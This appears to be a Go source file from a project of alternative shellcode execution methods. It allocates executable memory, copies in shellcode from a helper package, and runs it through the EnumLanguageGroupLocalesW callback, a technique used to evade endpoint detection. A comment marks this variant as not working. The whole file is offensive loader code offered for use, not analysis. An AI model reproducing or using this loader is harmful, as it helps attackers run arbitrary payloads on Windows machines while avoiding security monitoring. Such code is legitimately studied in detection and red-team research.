package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"golang.org/x/sys/windows"
	"unsafe"
)

const (
	LGRPID_ARABIC = 0x00000001
)

// 不可用
func Run(op []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	kernel32.NewProc("VirtualAlloc")
	enumLanguageGroupLocales := windows.NewLazySystemDLL("kernel32.dll").NewProc("EnumLanguageGroupLocalesW")

	address, err := windows.VirtualAlloc(0, uintptr(len(op)), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("VirtualAlloc failed with error: %v\n", err)
		return
	}
	fmt.Println("VirtualAlloc succeeded")

	for i := range op {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = op[i]
	}

	ret, _, err := enumLanguageGroupLocales.Call(address, uintptr(LGRPID_ARABIC), 0, 0)
	if ret == 0 {
		fmt.Printf("EnumLanguageGroupLocalesW failed with error: %v\n", err)
		return
	}
	fmt.Println("EnumLanguageGroupLocalesW succeeded")
}

func main() {
	Run(util.ShellCode())
}
